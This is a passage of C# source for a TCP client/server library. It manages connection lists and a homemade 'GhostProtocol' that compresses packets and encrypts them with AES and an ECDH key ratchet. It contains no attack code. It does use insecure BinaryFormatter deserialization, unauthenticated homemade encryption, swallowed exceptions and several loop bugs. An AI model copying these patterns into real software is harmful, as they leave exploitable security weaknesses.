                UpdateConnection(connection);
                return connection;
            }
            catch (Exception)
            {
                Connection connection = getConnectionByIP(IP);
                connection.Clean();
                if (connection.FaultFunction != null)
                { connection = connection.FaultFunction.Invoke(connection); }
                return connection;
            }
        }

        public static Connection _SendGhost(Connection connection)
        {
            try
            {
                //get whisp
                connection = PullConnection(connection);
                if (!connection.Tcp.Connected)
                {
                    try
                    {
                        //_////Disconnect(connection);
                        connection.Stream.Close();
                        return connection;
                    }
                    catch { }
                }

                connection.Packet.ip = connection.Tcp.Client.LocalEndPoint.ToString();
                connection = _MakePacket(connection);
                connection.whisp.cng.plaintextBytes = connection.Packet.bytes;
                connection.whisp = connection.Ghost.Ghost(connection.whisp);
                //connection.cng = connection.whisp.cng; //update cng

                if (connection.Stream.CanWrite)
                {
                    connection.Stream.Write(connection.whisp.bytes, 0, connection.whisp.bytes.Length);
                }
                connection.Clean();
                //return whisp
                PushConnection(connection);
                return connection;
            }
            catch (Exception)
            {
                connection.Clean();
                if (connection.FaultFunction != null)
                { connection = connection.FaultFunction.Invoke(connection); }
                return connection;
            }
        }


        public Connection Recieve(Connection d, int buffer = 512)
        {
            try
            {
                d.Packet = new Packet();
                d.Packet.bytes = new Byte[buffer];
                d.Stream.Read(d.Packet.bytes, 0, d.Packet.bytes.Length);
                d.Bytes = d.Packet.bytes;
                return d;
            }
            catch (Exception)
            {
                if (d.FaultFunction != null)
                { d = d.FaultFunction(d); }
                return d;
            }
        }
        public Connection Connect(Connection connection, int Timeout = 2000, bool AutoReconnect = false)
        {
            try
            {
                connection.Ghost = new GhostProtocol.Ghoster();
                connection.whisp = new GhostProtocol.Whisp();
                connection.useCng = true;
                connection.Tcp = new TcpClient(connection.RHOST, connection.RPORT);

                if (connection.Tcp.Connected)
                {
                    connection.IP = connection.Tcp.Client.LocalEndPoint.ToString();
                    connection.Stream = connection.Tcp.GetStream();
                    connection.IsConnected = true;
                }
                else
                {
                    ConnectionFail(new _ConnectionEvent(connection));
                }
            }
            catch (Exception ee)
            {
                newException(new _ExceptionOccured(ee));
                StatusReturn(new _StatusEvent("Error Connecting To Server:" + connection.RHOST + ":" + connection.RPORT.ToString()));
                ConnectionFail(new _ConnectionEvent(connection));
                //if (AutoReconnect)
                //{
                  //  System.Threading.Thread.Sleep(Timeout);
                    //StartGhostClient("Client", connection.RHOST, connection.RPORT, connection.TaskFunction, connection.FaultFunction, AutoReconnect, Timeout);
                    
                //}
                connection.IsConnected = false;
                return connection;
            }
            return connection;

        }
        public Connection Disconnect(Connection connection)
        {

            try
            {
                connection.Stream.Close();
                StatusReturn(new _StatusEvent(connection.IP + " Disconnected @" + DateTime.Now.ToString()));
                DisconnectedEvent(new _ConnectionEvent(connection));
                //var ret = //removeConnection(connection);
                
            }
            catch (Exception ee)
            {
                newException(new _ExceptionOccured(ee));
            }
            return connection;
        }
        public static byte[] trimByte(byte[] input)
        {
            if (input.Length > 1)
            {
                int byteCounter = input.Length - 1;
                while (input[byteCounter] == 0x00)
                {
                    byteCounter--;
                }
                byte[] rv = new byte[(byteCounter + 1)];
                for (int byteCounter1 = 0; byteCounter1 < (byteCounter + 1); byteCounter1++)
                {
                    rv[byteCounter1] = input[byteCounter1];
                }
                return rv;
            }
            else { return input; }
        } //trims null from end of byte array

        public void UpdateServerData(ServerData serverData)
        {
            int i = 0;
            lock (_serverLocker)
            {
                foreach (var server in ServerList)
                {
                    if (server.Name.Equals(serverData.Name))
                    {
                        ServerList[i] = serverData;
                        return;
                    }
                    ++i;
                }
            }
        }
        public void UpdateConnection(Connection connection)
        {
            if (connection.ID == null || connection.IP == null)
            {
                StatusReturn(new _StatusEvent("CONNECTION NOT UPDATED, MISSING IP OR ID"));
                return;
            }
            int i = 0;
            if (ClientList.Count > 0)
            {
                i = 0;
                lock (_clientLocker)
                {
                    foreach (var client in ClientList)
                    {
                        if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                        {
                            ClientList[i] = connection;
                            return;
                        }
                    }
                }
            }

            i = 0;
            int ii = 0;
            lock (_serverLocker)
            {
                foreach (var server in ServerList)
                {
                    foreach (var client in server.Connections)
                    {
                        if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                        {
                            ServerList[i].Connections[ii] = connection;
                            //or remove and replace
                            return;
                        }
                        ++ii;
                    }
                    ++i;
                }
            }

        }
        public bool removeConnection(Connection connection)
        {
            if (connection.ID == null || connection.IP == null)
            {
                StatusReturn(new _StatusEvent("CONNECTION NOT RETRIEVED, MISSING IP OR ID"));
                return false;
            }
            lock (_clientLocker)
            {
                if (ClientList.Count > 0)
                {
                    foreach (var client in ClientList)
                    {
                        if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                        {
                            ClientList.Remove(client);
                            return true;
                        }
                    }
                }
            }

            lock (_serverLocker)
            {
                foreach (var server in ServerList)
                {
                    if (server.Name.Equals(connection.ServerName))
                    {
                        foreach (var client in server.Connections)
                        {
                            if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                            {
                                server.Connections.Remove(client);
                                return true;
                            }
                        }
                        break;
                    }
                }

            }
            return false;

        }
        public static void removeDeadConnections()
        {
            List<Connection> RemovalList = new List<Connection>();
            lock (_clientLocker)
            {
                if (ClientList.Count > 0)
                {
                    foreach (var client in ClientList)
                    {
                        if (!client.IsConnected)
                        {
                            RemovalList.Add(client);
                        }
                    }
                }
                foreach (var removal in RemovalList)
                {
                    ClientList.Remove(removal);

                }
            }

            lock (_serverLocker)
            {
                foreach (var server in ServerList)
                {
                    RemovalList = new List<Connection>();
                    foreach (var client in server.Connections)
                    {
                        if (!client.IsConnected)
                        {
                            RemovalList.Add(client);
                        }
                    }
                    foreach (var removal in RemovalList)
                    {
                        server.Connections.Remove(removal);
                    }
                }

            }

            return;
        }
        public static bool _Disconnect(Connection connection, bool disconnect = true)
        {
            try
            {
                lock (_clientLocker)
                {
                    if (ClientList.Count > 0)
                    {
                        foreach (var client in ClientList)
                        {
                            if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                            {
                                if (disconnect)
                                { client.Stream.Close(); }
                                ClientList.Remove(client);
                                return true;
                            }
                        }
                    }
                }

                lock (_serverLocker)
                {
                    foreach (var server in ServerList)
                    {
                        if (server.Name.Equals(connection.ServerName))
                        {
                            foreach (var client in server.Connections)
                            {
                                if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                                {
                                    if (disconnect)
                                    { client.Stream.Close(); }
                                    server.Connections.Remove(client);
                                    return true;
                                }
                            }
                            break;
                        }
                    }

                }
                return false;
            }
            catch (Exception ee)
            {
                EX = ee;
                return false;
            }
        }

        public static Connection PullConnection(Connection connection)
        {
            try
            {
                lock (_clientLocker)
                {
                    if (ClientList.Count > 0)
                    {
                        foreach (var client in ClientList)
                        {
                            if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                            {
                                connection.whisp = client.whisp;
                                connection.cng = client.cng;
                                connection.FaultFunction = client.FaultFunction;
                                connection.TaskFunction = client.TaskFunction;
                                if (client.PacketListenerMethod != null)
                                    connection.AddPacketHandler(client.PacketListenerMethod);
                                if (client.FaultListenerMethod != null)
                                    connection.AddFaultHandler(client.FaultListenerMethod);
                                break;
                            }
                        }
                    }
                }

                lock (_serverLocker)
                {
                    foreach (var server in ServerList)
                    {
                        if (server.Name.Equals(connection.ServerName))
                        {
                            foreach (var client in server.Connections)
                            {
                                if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                                {
                                    connection.whisp = client.whisp;
                                    connection.cng = client.cng;
                                    connection.FaultFunction = client.FaultFunction;
                                    connection.TaskFunction = client.TaskFunction;
                                    if (client.PacketListenerMethod != null)
                                        connection.AddPacketHandler(client.PacketListenerMethod);
                                    if (client.FaultListenerMethod != null)
                                        connection.AddFaultHandler(client.FaultListenerMethod);
                                    break;
                                }
                            }
                            break;
                        }
                    }

                }

            }
            catch (Exception ee)
            {
                EX = ee;
            }
            return connection;
        }
        public static void PushConnection(Connection connection)
        {
            try
            {
                int i = 0;
                if (ClientList.Count > 0)
                {
                    i = 0;
                    lock (_clientLocker)
                    {
                        foreach (var client in ClientList)
                        {
                            if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                            {
                                ClientList[i] = connection;
                                return;
                            }
                        }
                    }
                }

                i = 0;
                int ii = 0;
                lock (_serverLocker)
                {
                    foreach (var server in ServerList)
                    {
                        foreach (var client in server.Connections)
                        {
                            if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                            {
                                ServerList[i].Connections[ii] = connection;
                                //or remove and replace
                                return;
                            }
                            ++ii;
                        }
                        ++i;
                    }
                }
            }
            catch (Exception ee)
            {
                EX = ee;
            }
        }
        public List<Connection> FindDisconnected(List<Connection> Connections)
        {
            List<Connection> RemovalList = new List<Connection>();
            foreach (var connection in Connections)
            {
                if (!connection.Tcp.Connected)
                {
                    RemovalList.Add(connection);
                }
            }
            return RemovalList;
        }
        public List<Connection> checkConnections(List<Connection> Connections)
        {
            List<Connection> RemovalList = new List<Connection>();
            foreach (var connection in Connections)
            {
                if (!connection.Tcp.Connected)
                {
                    RemovalList.Add(connection);
                }
            }
            foreach (var removal in RemovalList)
            {
                Connections.Remove(removal);
                DisconnectedEvent(new _ConnectionEvent(removal));
            }
            return Connections;

        }
        public Connection getConnection(Connection connection)
        {
            if (connection.ID == null || connection.IP == null)
            {
                StatusReturn(new _StatusEvent("CONNECTION NOT RETRIEVED, MISSING IP OR ID"));
                return connection;
            }
            lock (_clientLocker)
            {
                if (ClientList.Count > 0)
                {
                    foreach (var client in ClientList)
                    {
                        if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                        {
                            connection.whisp = client.whisp;
                            connection.cng = client.cng;
                            connection.FaultFunction = client.FaultFunction;
                            connection.TaskFunction = client.TaskFunction;
                            if (client.PacketListenerMethod != null)
                                connection.AddPacketHandler(client.PacketListenerMethod);
                            if (client.FaultListenerMethod != null)
                                connection.AddFaultHandler(client.FaultListenerMethod);
                            break;
                        }
                    }
                }
            }

            lock (_serverLocker)
            {
                foreach (var server in ServerList)
                {
                    if (server.Name.Equals(connection.ServerName))
                    {
                        foreach (var client in server.Connections)
                        {
                            if (connection.IP.Equals(client.IP) && connection.ID.Equals(client.ID))
                            {
                                connection.whisp = client.whisp;
                                connection.cng = client.cng;
                                connection.FaultFunction = client.FaultFunction;
                                connection.TaskFunction = client.TaskFunction;
                                if (client.PacketListenerMethod != null)
                                    connection.AddPacketHandler(client.PacketListenerMethod);
                                if (client.FaultListenerMethod != null)
                                    connection.AddFaultHandler(client.FaultListenerMethod);
                                break;
                            }
                        }
                        break;
                    }
                }

            }
            return connection;

        }
        public Connection getConnectionByID(string ID = "NOID")
        {

            lock (_clientLocker)
            {
                if (ClientList.Count > 0)
                {
                    foreach (var client in ClientList)
                    {
                        if (ID.Equals(client.ID))
                        {
                            return client;
                        }
                    }
                }


                lock (_serverLocker)
                {
                    foreach (var server in ServerList)
                    {
                        foreach (var client in server.Connections)
                        {
                            if (ID.Equals(client.ID))
                            {
                                return client;
                            }
                        }
                    }
                }

                return new Connection();
            }
        }
        public Connection getConnectionByCID(int CID = 0)
        {

            lock (_clientLocker)
            {
                if (ClientList.Count > 0)
                {
                    foreach (var client in ClientList)
                    {
                        if (CID.Equals(client.CID))
                        {
                            return client;
                        }
                    }
                }


                lock (_serverLocker)
                {
                    foreach (var server in ServerList)
                    {
                        foreach (var client in server.Connections)
                        {
                            if (CID.Equals(client.CID))
                            {
                                return client;
                            }
                        }
                    }
                }

                return new Connection();
            }
        }
        public Connection getConnectionByIP(string IP = "127.0.0.1:10101")
        {

            lock (_clientLocker)
            {
                if (ClientList.Count > 0)
                {
                    foreach (var client in ClientList)
                    {
                        if (IP.Equals(client.IP))
                        {
                            return client;
                        }
                    }
                }


                lock (_serverLocker)
                {
                    foreach (var server in ServerList)
                    {
                        foreach (var client in server.Connections)
                        {
                            if (IP.Equals(client.IP))
                            {
                                return client;
                            }
                        }
                    }
                }

                return new Connection();
            }
        }

        private void Client_Listen_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                if (e.Cancel)
                    return;
                Connection connection = (Connection)e.Argument;
                connection.Packet = new Packet();

                connection.Packet.bytes = new Byte[connection.RecieveBufferSize];
                //get connection o have most fresh data
                Int32 i = connection.Stream.Read(connection.Packet.bytes, 0, connection.Packet.bytes.Length);
                //get Whisp
               

                if (e.Cancel)
                    return;
                connection = getConnection(connection);
                connection.whisp.bytes = new byte[i];
                for (int c = 0; c < i; ++c)
                {
                    connection.whisp.bytes[c] = connection.Packet.bytes[c];
                }
                //connection.whisp.cng = connection.cng;
                connection.whisp = connection.Ghost.listen(connection.whisp);
                //connection.cng = connection.whisp.cng;
                connection.Packet.bytes = connection.whisp.bytes;
                //connection.cng.bpublicKey = connection.whisp.cng.bpublicKey;
                e.Result = connection;
                //return whisp
                UpdateConnection(connection); //update master
            }
            catch (Exception ee)
            {
                newException(new _ExceptionOccured(ee));
                Connection d = (Connection)e.Argument;                
                d.IsConnected = false;
                d.FaultListenerMethod?.Invoke(ee, new _ConnectionEvent(d));
                e.Result = d;
            }
        }
        private void Client_Listen_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            try
            {
                Connection connection = (Connection)e.Result;
                connection = ParsePacket(connection);
                if (connection.Packet.flag.ToUpper().Contains("DISCONNECT"))
                {
                    connection.Packet = new Packet();
                    connection.Packet.flag = "<DISCONNECT>";
                    connection.Packet.data = connection.Tcp.Client.LocalEndPoint.ToString() + "::" + DateTime.Now.ToString();
                    SendGhostByIP(connection.Packet, connection.IP);

                    connection.Stream.Close();
                    connection.IsConnected = false;
                }
                
                connection.PacketListenerMethod?.Invoke(connection.Packet, new _ConnectionEvent(connection));
                PacketReturn(new _ConnectionEvent(connection));
                if (connection.TaskFunction != null)
                { connection = connection.TaskFunction.Invoke(connection); }

                connection.Packet = new Packet();

                if (!e.Cancelled && connection.Tcp.Connected)
                    connection.Worker.RunWorkerAsync(connection);
                else
                {
                    DisconnectedEvent(new _ConnectionEvent(connection));                   
                }
            }
            catch (Exception ee)
            {
                newException(new _ExceptionOccured(ee));
                Connection d = (Connection)e.Result;
                if (d.FaultFunction != null)
                { d = d.FaultFunction.Invoke(d); }
                d.FaultListenerMethod?.Invoke(ee, new _ConnectionEvent(d));
                if (!e.Cancelled && d.Tcp.Connected)
                { d.Worker.RunWorkerAsync(d); }
                else
                {                    
                    DisconnectedEvent(new _ConnectionEvent(d));
                }
            }
        }
    }
    #endregion
    #region Structures
    public partial struct Account
    {
        public string Name;
        public string Key;
        public string Id;
        public string Ip;
        public object Tag;
        public string isMaster;
    }
    public partial struct AccountDB
    {
        public byte[] Write(string path)
        {
            var bytes = new byte[0];
            try
            {
                IFormatter formatter = new BinaryFormatter();
                Stream stream = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None);
                formatter.Serialize(stream, this);
                byte[] buf;
                buf = new byte[stream.Length];
                stream.Read(buf, 0, buf.Length);
                stream.Close();
                bytes = buf;
            }
            catch { }

            return bytes;
        }
        public static AccountDB Read(string path)
        {
            AccountDB obj = new AccountDB();
            try
            {
                IFormatter formatter = new BinaryFormatter();
                Stream stream = new FileStream(path,
                                          FileMode.Open,
                                          FileAccess.Read,
                                          FileShare.Read);
                obj = (AccountDB)formatter.Deserialize(stream);
                stream.Close();
            }
            catch { }
            return obj;
        }

        public static AccountDB Create()
        {
            AccountDB q = new AccountDB();
            q.AccountsList = new List<Account>();
            return q;
        }
        public List<Account> AccountsList;
    }
    public partial struct ServerData
    {
        public static ServerData Create(int buffer = 1024)
        {
            ServerData m = new ServerData();
            m.Connections = new List<Connection>();
            m.BufferSize = buffer;
            m.ServerWorker = new BackgroundWorker();
            m.Accounts = AccountDB.Create();
            m.serverConnection = new Connection();
            return m;
        }
        public BackgroundWorker ServerWorker;
        public delegate Connection cc(Connection con);
        public cc StartClientDelegate;
        public string Name;
        public string ID;
        public string Host;
        public int Port;
        public int Timeout;
        public AccountDB Accounts;
        public List<Connection> Connections;
        public Connection serverConnection;
        public ECDHAES256.AES crypto;
        public ECDHAES256.DH dh;
        public Packet packet;
        public Ghost Server;
        public int BufferSize;
        public int CID;
        public EventHandler<_ConnectionEvent> PacketEvent;
        public Func<Connection, Connection> TaskFunction;
        public Func<Connection, Connection> FaultFunction;
    }
    public partial struct Connection
    {
        public bool AddPacketHandler(Action<object, _ConnectionEvent> Event)
        {
            try
            {
                PacketListener += new EventHandler<_ConnectionEvent>(Event);
                return true;
            }
            catch
            {
                return false;
            }
        }
        public bool RemovePacketHandler(Action<object, _ConnectionEvent> Event)
        {
            try
            {
                PacketListener -= new EventHandler<_ConnectionEvent>(Event);
                return true;
            }
            catch
            {
                return false;
            }
        }
        public bool AddFaultHandler(Action<object, _ConnectionEvent> Event)
        {
            try
            {
                FaultListener += new EventHandler<_ConnectionEvent>(Event);
                return true;
            }
            catch
            {
                return false;
            }
        }
        public bool RemoveFaultHandler(Action<object, _ConnectionEvent> Event)
        {
            try
            {
                FaultListener -= new EventHandler<_ConnectionEvent>(Event);
                return true;
            }
            catch
            {
                return false;
            }
        }
        public Action<object, _ConnectionEvent> PacketListenerMethod;
        public Action<object, _ConnectionEvent> FaultListenerMethod;
        public event EventHandler<_ConnectionEvent> FaultListener;
        public event EventHandler<_ConnectionEvent> PacketListener;
        public static Connection Create(int buffer = 2048)
        {
            Connection c = new Connection();
            c.Account = new Account();
            c.RecieveBufferSize = buffer;
            c.IsConnected = false;
            c.Ghost = new GhostProtocol.Ghoster();
            c.whisp = new Whisp();
            c.whisp.cng = new ECDHAES256.CNG();
            c.whisp.ratchet = new Ratchet();
            c.whisp.ratchet.dh = new ECDHAES256.DH();
            c.whisp.ratchet.cng = new ECDHAES256.CNG(); ;
            return c;
        }
        public void Clean()
        {
            try
            {
                Packet = Packet.Create(RecieveBufferSize);
                Bytes = null;
                cng.iv = null;
                cng.plaintextBytes = null;
                cng.encryptedBytes = null;
            }
            catch (Exception)
            { }
        }
        public bool useCompression;
        public bool useGhost;
        public string ServerName;
        public GhostProtocol.Ghoster Ghost;
        public GhostProtocol.Whisp whisp;
        public Int32 RecieveBufferSize;
        public String LastSend;
        public String LastRecv;
        public object Controller;
        public Type ControllerType;
        public Func<Connection, Connection> TaskFunction;
        public Func<Connection, Connection> FaultFunction;
        public Account Account;
        public void StartWorker()
        {
            if (Worker != null)
            {
                Worker.RunWorkerAsync(this);
            }
        }
        public void StopWorker()
        {
            if (Worker != null)
            {
                Worker.CancelAsync();
            }
        }
        public BackgroundWorker Worker;
        public Packet Packet;
        public string RHOST;
        public Int32 RPORT;
        public TcpClient Tcp;
        public TcpListener Server;
        public NetworkStream Stream;
        public object Tag;
        public byte[] Bytes;
        public ECDHAES256.CNG cng;
        //public ECDHAES256.CNG ratchet;
        public bool useCng;
        public ECDHAES256.DH dh;
        public string MIP;
        public bool IsMaster;
        public bool IsReturned;
        public bool IsConnected;
        public int CID;
        public string IP;
        public string ID;

    }
    public partial struct Packet
    {
        public static Packet Create(int buffer = 512)
        {
            Packet p = new Packet();
            p.bytes = new byte[buffer];
            return p;
        }
        public static Packet Create(string data = "", string flag = "", string arg = "", string length = "", string ip = "", int buffer = 512)
        {
            Packet p = new Packet();
            p.bytes = new byte[buffer];
            p.data = data;
            p.arg = arg;
            p.flag = flag;
            p.length = length;
            p.ip = ip;
            return p;
        }

        public String ip;
        public String arg;
        public String length;
        public String flag;
        public String data;
        public object tag;
        public Byte[] bytes;
        public string packet;
    }
    #endregion
    #region Namespaces

    namespace GhostProtocol
    {
        using Compression;
        using ECDHAES256;
        using System.IO;
        public struct Whisp
        {

            public void Clean(bool cleanBytes = false)
            {
                messageSize = new byte[4];
                compressionSize = new byte[4];
                if (cleanBytes == true)
                { bytes = null; }
                obj = null;
            }
            public bool ratchetIsPrimmed;
            public AES aes;
            public DH dh;
            public CNG cng;
            public Ratchet ratchet;
            public Compression compression;
            public string aname;
            public object obj;
            public byte[] messageSize;
            public byte[] compressionSize;
            public byte[] publicKey;
            public byte[] bytes;
        }
        public struct Ratchet
        {
            public CNG cng;
            public DH dh;
            public bool aliceReady;
            public bool bobReady;
        }
        public class Ghoster
        {

            /*A Whsiper is an AES256 encrypting packet protocol defined as *******************************************
            *   speak() encapsulates compresses and encrypts
            *   listen() decrypts decompresses and decapsulates
            *   4 byte Int32 for compressed payload size
            *   4 byte Int32 for original uncompressed size of payload
            *   140 byte for public key
            *   rest is Payload
            *   
            *   provide 256 bit key in Whisp.cng.key USES: ECDHAES2
            *
            *   returned is aes.cng.encryptedBytes appended to the aes.cng.iv
            *
            ***************************************************************************************/
            public Whisp whisp;

            /// <summary>Ghost Softly [4 byte Int32 for compressed payload size in bytes]+[4 byte Int32 for original payload size in bytes]+[Payload]</summary>
            public Ghoster()
            {
                whisp = new Whisp();
                whisp.dh = new DH();
                whisp.aes = new AES();
                whisp.compression = new Compression();
                whisp.cng = new CNG();
                whisp.ratchet = new Ratchet();
                whisp.ratchet.dh = new DH();
            }
            /// <summary>Speak in a Ghost..Supply Ghost.cng.key and whsiper.cng.plaintextBytes</summary>
            /// <param name="whisp"> Supply Ghost.cng.key and whsiper.cng.plaintextBytes</param>
            public Whisp Ghost(Whisp whisp)
            {
                try
                {
                    //whisp = readyRatchet(whisp); //public key ready for next dh exchange
                    whisp = ratchet(whisp);
                    whisp.publicKey = whisp.ratchet.cng.publicKey;
                    if (whisp.cng.plaintextBytes == null && whisp.bytes != null)
                    {
                        whisp.cng.plaintextBytes = whisp.bytes;
                    }
                    //Label Compression Original Size
                    whisp.compressionSize = BitConverter.GetBytes(whisp.cng.plaintextBytes.Length);
                    //Compress
                    whisp.compression = new Compression();
                    byte[] compressedBytes = whisp.compression.CompressBytesToBytes(whisp.cng.plaintextBytes);
                    //label Compressed message size             
                    whisp.messageSize = BitConverter.GetBytes(compressedBytes.Length); //PLUS 2 for HEADER
                                                                                       //MAKE READY PACKET *** ADD PUBLIC KEY ***
                    IEnumerable<byte> result = whisp.messageSize.Concat(whisp.compressionSize).Concat(whisp.publicKey).Concat(compressedBytes);
                    whisp.cng.plaintextBytes = result.ToArray(); //header is first 8+140 bytes
                                                                 //Encrypt PACKET
                    whisp.aes = new AES();
                    whisp.cng = whisp.aes.encrypt(whisp.cng);
                    //Return Whisp, 
                    IEnumerable<byte> result2 = whisp.cng.iv.Concat(whisp.cng.encryptedBytes);
                    whisp.bytes = result2.ToArray();
                    whisp.ratchet.aliceReady = true;
                    //if (whisp.ratchet.aliceReady && whisp.ratchet.bobReady)
                    //{
                    whisp = ratchet(whisp);
                    //}
                    whisp.Clean();

                    return whisp;
                }
                catch (Exception e)
                {
                    whisp.obj = e;
                    return whisp;
                }
            } //you supply whisp.cng
              /// <summary>Listen to a Ghost..Supply Ghost.cng.key and Ghost.cng.encryptedBytes</summary>
              /// <param name="whisp"> Supply Ghost.cng.key and Ghost.cng.encryptedBytes</param>
            public Whisp listen(Whisp whisp)
            {
                /*supply Ghost.cng.key and Ghost.bytes
                *   Ghost Ghost = new Ghost();
                *   Whisp whisp = new Whisp();
                *   whisp.cng.key = yourKey; //256 byte key for AES256
                *   whisp.bytes = yourRecievedWhispBytes;
                *   whisp = Ghost.listen(whisp);
                *   parse(whisp.bytes);
                */
                try
                {
                    using (MemoryStream encrypted = new MemoryStream(whisp.bytes))
                    {


                        //Decrypt Ghost
                        whisp.cng.iv = new byte[16];
                        encrypted.Read(whisp.cng.iv, 0, 16);

                        whisp.cng.encryptedBytes = new byte[Convert.ToInt32(encrypted.Length) - 16];
                        encrypted.Read(whisp.cng.encryptedBytes, 0, whisp.cng.encryptedBytes.Length);
                        whisp.aes = new AES();
                        whisp.cng = whisp.aes.decrypt(whisp.cng); //USE CURRENT KEY
                                                                  //Ghost.Clean(true);
                        using (MemoryStream stream = new MemoryStream(whisp.cng.plaintextBytes))
                        {
                            whisp.messageSize = new byte[4];
                            whisp.compressionSize = new byte[4];
                            stream.Read(whisp.messageSize, 0, 4);
                            stream.Read(whisp.compressionSize, 0, 4);
                            whisp.publicKey = new byte[140]; //GET RATCHET PUBLIC KEY
                            stream.Read(whisp.publicKey, 0, whisp.publicKey.Length);
                            byte[] compressed = new byte[BitConverter.ToInt32(whisp.messageSize, 0)];
                            stream.Read(compressed, 0, compressed.Length);
                            whisp.bytes = new byte[BitConverter.ToInt32(whisp.compressionSize, 0)];
                            //Decompress 
                            whisp.compression = new Compression();
                            whisp.bytes = whisp.compression.DeCompressBytesToBytes(compressed, BitConverter.ToInt32(whisp.compressionSize, 0));
                            whisp.ratchet.bobReady = true; //recieved public key from alice
                            whisp = ratchet(whisp); //RATCHET KEY MADE Ghost.cng is replaced

                            //returnable.Clean();
                            return whisp;
                        }

                    }
                }
                catch (Exception e)
                {
                    whisp.obj = e;
                    return whisp;
                }
            }
            private Whisp primeRatchet(Whisp whisp)
            {
                try
                {
                    if (whisp.ratchetIsPrimmed == false)
                    {
                        whisp.ratchet.dh = new DH();
                        if (whisp.publicKey != null)//whisp.ratchet.cng.key== null &&
                        {
                            whisp.ratchet.cng = new CNG();
                            whisp.ratchet.cng.bpublicKey = whisp.publicKey;
                            whisp.ratchet.cng = whisp.ratchet.dh.b(whisp.ratchet.cng); //KEY MADE BUT NOT READY TO USE unless you call bobReady=true
                        }
                        else
                        { //is null
                            whisp.ratchet.cng = whisp.ratchet.dh.a(new CNG()); //ratchet houses alice now
                        }
                        //PROBLEM!!!! moved to Ghost
                        //whisp.ratchet.aliceReady = true;
                        whisp.ratchetIsPrimmed = true;
                        return whisp;
                    }

                    return whisp;
                }
                catch (Exception e)
                {
                    whisp.obj = e;
                    return whisp;
                }
            }
            private Whisp ratchet(Whisp whisp)
            {
                try
                {
                    //whisp.ratchet.cng.alice == null && whisp.ratchet.cng.publicKey==null
                    if (whisp.ratchetIsPrimmed == false) //IF this is the first ratchet
                    {
                        whisp = primeRatchet(whisp); //aliceReady is still false until first send
                    }
                    if (whisp.ratchet.aliceReady == true && whisp.ratchet.bobReady == true) //both sides ready to ratchet
                    {//alice must be present and bpublic key must be present
                     //PROBLEM BOB JUST SEND PK
                        if (whisp.ratchet.cng.key == null)
                        {
                            whisp.ratchet.cng.bpublicKey = whisp.publicKey;
                            whisp.ratchet.cng = whisp.ratchet.dh.a(whisp.ratchet.cng); //makes key
                        }
                        else if (whisp.ratchet.cng.key != null)
                        {
                            //key was already made
                        }
                        //TRANSFER
                        whisp.cng = whisp.ratchet.cng; //MAY NEED CLEANING FIRST
                                                       //CLEAN
                        whisp.ratchet.dh = new DH();
                        //whisp.ratchet.cng = new CNG(); //new alice
                        whisp.ratchetIsPrimmed = false;
                        whisp.ratchet.aliceReady = false;
                        whisp.ratchet.bobReady = false;
                        whisp.publicKey = null;
                        //whisp.cng.clean();

                        return whisp;
                    }
                    return whisp;
                }
                catch (Exception e)
                { whisp.obj = e; return whisp; }
            }
        }
    }
    namespace ECDHAES256
    {
        using System;
        using System.IO;
        using System.Security.Cryptography;
        public struct CNG
        {
            public void clean()
            {
                alice = null;
                bob = null;
                iv = null;
                bpublicKey = null;
                encryptedBytes = null;
                plaintextBytes = null;
            }
            public CngKey cngkey;
            public ECDiffieHellmanCng alice;
            public ECDiffieHellmanCng bob;
            public Byte[] key;
            public Byte[] iv;
            public Byte[] publicKey;
            public Byte[] bpublicKey;
            public Byte[] encryptedBytes;
            public Byte[] plaintextBytes;
        }
        public class AES
        {
            public CNG cng { get; set; }
            public byte[] key { get; private set; }
            public AES()
            {
                CNG c = new CNG();
                c.key = key = RijndaelManaged.Create().Key;
                cng = c;
            }
            public CNG encrypt(CNG c)
            {
                EncryptMessage(c.key, c.plaintextBytes, out c.encryptedBytes, out c.iv);
                c.plaintextBytes = null;
                return c;
            }
            private void EncryptMessage(Byte[] key, Byte[] plaintextMessage, out Byte[] encryptedMessage, out Byte[] iv)
            {
                using (Aes aes = new AesCryptoServiceProvider())
                {
                    aes.Key = key;
                    iv = aes.IV;
                    using (MemoryStream ciphertext = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ciphertext, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(plaintextMessage, 0, plaintextMessage.Length);
                            cs.Close();
                            encryptedMessage = ciphertext.ToArray();
                        }
                    }
                }
            }
            public CNG decrypt(CNG c)
            {
                DecryptMessage(out c.plaintextBytes, c.encryptedBytes, c.iv, c.key);
                c.encryptedBytes = null;
                c.iv = null;
                return c;
            }
            private void DecryptMessage(out Byte[] plaintextBytes, Byte[] encryptedBytes, Byte[] iv, Byte[] bkey)
            {

                using (Aes aes = new AesCryptoServiceProvider())
                {
                    aes.Key = bkey;
                    aes.IV = iv;
                    // Decrypt the message
                    using (MemoryStream plaintext = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(plaintext, aes.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(encryptedBytes, 0, encryptedBytes.Length);
                            cs.Close();
                            encryptedBytes = null;
                            plaintextBytes = plaintext.ToArray();
                        }
                    }
                }
            }
        }
        public class DH
        {
            private static CNG cng;
            public DH()
            {
                cng = new CNG();
            }
            public CNG a(CNG c)
            {
                if (c.alice == null)
                {
                    c.alice = new ECDiffieHellmanCng();

                    c.alice.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
                    c.alice.HashAlgorithm = CngAlgorithm.Sha256;
                    c.publicKey = c.alice.PublicKey.ToByteArray();
                    c.encryptedBytes = null;
                    c.iv = null;
                    c.plaintextBytes = null;
                    return c;

                }
                if (c.alice != null)
                {
                    try
                    {
